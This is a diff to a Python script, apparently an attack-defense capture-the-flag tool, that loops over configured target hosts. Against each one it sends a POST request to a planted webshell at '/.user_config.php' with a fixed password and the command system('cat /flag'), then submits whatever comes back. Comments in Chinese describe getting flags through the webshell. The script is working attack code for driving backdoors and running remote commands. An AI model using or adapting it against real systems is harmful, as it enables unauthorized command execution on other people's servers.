@@ -7,8 +7,12 @@ from core.data import *
 import re
 
 
+def web_run():
+    for i in range(0,len(conf.targets)):
+        getflag(conf.targets[i],conf.ports[i])
 
-def getflag():  #获取flag并自动提交，通过webshell来获取flag
+
+def getflag(target, port):  #获取flag并自动提交，通过webshell来获取flag
     uri = "/.user_config.php"  #shell地址
     header = {
 		"Content-Type": "application/x-www-form-urlencoded",
@@ -16,17 +20,14 @@ def getflag():  #获取flag并自动提交，通过webshell来获取flag
 	}
     data = "pass=WJdhNWqs&cmd=system('cat /flag');"
     #data = "cmd=system('cat /flag');"
-    with open('web_targets.txt', 'r') as f:
-        targets = f.readlines()
-        for target in targets:
-            target = target.strip()
-            url = "http://" + target + uri
-            try:
-                res = requests.post(url, headers=header, data=data,timeout=1)
-                submit_flag(res)
-            except Exception as f:
-                print(f)
-                print(url + "\tshell未上传成功\n")
+    url = target + uri
+
+    try:
+        res = requests.post(url, headers=header, data=data,timeout=1)
+        submit_flag(res)
+    except Exception as f:
+        print(f)
+        print(url + "\tshell未上传成功\n")
 
 
 def webshell():   #获取webshell
